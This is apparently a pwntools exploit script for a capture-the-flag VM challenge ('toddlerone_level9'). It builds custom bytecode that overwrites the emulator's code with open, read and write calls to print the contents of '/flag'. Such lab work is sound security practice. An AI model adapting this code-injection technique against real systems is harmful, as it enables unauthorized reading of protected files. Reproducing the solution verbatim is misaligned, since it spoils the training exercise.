from pwn import *
from pyrsistent import b
context.arch='amd64'
reg = {'a': b'\x08' , 'b':b'\x40' , 'c':b'\x02', 'd':b'\x20', 's':b'\x01', 'i':b'\x10', 'f':b'\x04'}
ins = {'sys': b'\x08', 'imm' : b'\x02', 'jmp' : 0x40}
systable = {'crash':b'\x10','read':b'\x20', 'write' :b'\x02','open' : b'\x08'}

def imm(regNo, imm):
    a = {'1' : int.to_bytes(imm,1,'little') , '2' : reg[regNo] , '3' : ins['imm']}
    return  a['3'] + a['2'] + a['1']

def jmp(regNo,flags):
    a = {'1' : int.to_bytes(flags,1,'little') , '2' : reg[regNo] , '3' : ins['jmp']}
    return  a['3'] + a['2'] + a['1']

def open1(file_name,flags,mode,ret_regNo):
    a = {'1' : systable['open'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',file_name)
    payload += imm('b',flags)
    payload += imm('c',mode)
    payload = payload + a['3'] + a['1'] + a['2']

    return payload

def read_0(fd,offset,count,ret_regNo):
    a = {'1' : systable['read'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload +  a['3'] + a['1'] + a['2']

    return payload

def write_300(fd,offset,count,ret_regNo):
    a = {'1' : systable['write'] , '2' : reg[ret_regNo] , '3' : ins['sys']}
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload +  a['3'] + a['1'] + a['2']

    return payload

def exit(v):
    payload = b''
    payload += imm('a',v)
    payload += b'\x01\x08\x00'

    return payload

r = process('/challenge/toddlerone_level9.1')
#r = process(['sudo','strace','/challenge/toddlerone_level9.0'])
payload = b''
payload += read_0(0,0xff,0xff,'d')
r.send(payload)
print(payload)

payload = b'\x00'*(4*0x03+1)
payload += read_0(0,0,5,'d')
payload += open1(0,0,0,'d')
payload += read_0(3,0x0,0x40,'d')
payload += write_300(1,0x0,0x40,'d')
r.send(payload)
r.send(b'/flag')


r.interactive()